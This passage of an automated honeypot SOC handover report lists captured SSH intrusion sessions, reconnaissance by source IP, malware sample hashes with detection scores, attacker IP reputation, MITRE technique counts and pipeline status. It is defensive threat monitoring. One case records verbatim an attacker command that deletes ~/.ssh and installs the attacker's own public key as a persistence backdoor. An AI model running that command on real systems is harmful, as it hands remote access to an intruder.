| **Source IP** | `223.123.65[.]63` |
| **First Seen** | 2026-04-25 07:15 |
| **Last Seen** | 2026-04-25 07:15 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 07:15:08` | `cowrie.session.connect` |
| `2026-04-25 07:15:08` | `cowrie.client.version` |
| `2026-04-25 07:15:09` | `cowrie.client.kex` |
| `2026-04-25 07:15:10` | `cowrie.login.success` |
| `2026-04-25 07:15:11` | `cowrie.session.params` |
| `2026-04-25 07:15:11` | `cowrie.command.input` |
| `2026-04-25 07:15:11` | `cowrie.command.failed` |
| `2026-04-25 07:15:12` | `cowrie.log.closed` |
| `2026-04-25 07:15:14` | `cowrie.session.params` |
| `2026-04-25 07:15:14` | `cowrie.command.input` |
| `2026-04-25 07:15:16` | `cowrie.session.file_download` |
| `2026-04-25 07:15:16` | `cowrie.log.closed` |
| `2026-04-25 07:15:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.123.65[.]63` to AbuseIPDB if not already reported
- [ ] Block `223.123.65[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeab727f1ae3

| Field | Detail |
|---|---|
| **Source IP** | `223.123.65[.]63` |
| **First Seen** | 2026-04-25 07:15 |
| **Last Seen** | 2026-04-25 07:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 07:15:22` | `cowrie.session.connect` |
| `2026-04-25 07:15:22` | `cowrie.client.version` |
| `2026-04-25 07:15:22` | `cowrie.client.kex` |
| `2026-04-25 07:15:24` | `cowrie.login.success` |
| `2026-04-25 07:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.123.65[.]63` to AbuseIPDB if not already reported
- [ ] Block `223.123.65[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.65[.]63` | **20** | 2026-04-25 05:52 | 2026-04-25 07:19 | 5m | 6 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `165.154.6[.]144` | **12** | 2026-04-25 05:52 | 2026-04-25 06:06 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.130.168[.]2` | **6** | 2026-04-25 06:02 | 2026-04-25 06:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-04-25 06:32 | 2026-04-25 06:32 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `223.123.41[.]69` | 1 | 2026-04-25 06:45 | 2026-04-25 06:45 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `223.123.41[.]69` | PK | CMPak Limited | **100** ⚠️ | 8 |
| `3.130.168[.]2` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `165.154.6[.]144` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 18 |
| `223.123.65[.]63` | PK | CMPak Limited | **100** ⚠️ | 50 |
| `168.210.111[.]200` | ZA | AS20011-IPV4-37 Broadband Consumer | **62** | 0 |
| `212.64.219[.]79` | TR | NAZNET Core Network | **38** | 0 |
| `93.66.3[.]48` | IT | Vodafone Italia S.p.A. | 5 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 53 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 19 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 15 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |

---

## 🔕 False Positive Summary (42 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 19 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 21 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 97 cases |
| Tool 34  | Credential Extractor        | ✅ 35 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 10 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 42 filtered (43.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 15 priority case(s) shown individually · 5 recon entry/entries in table (3 group(s) consolidating 38 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-25T07:24:37Z_
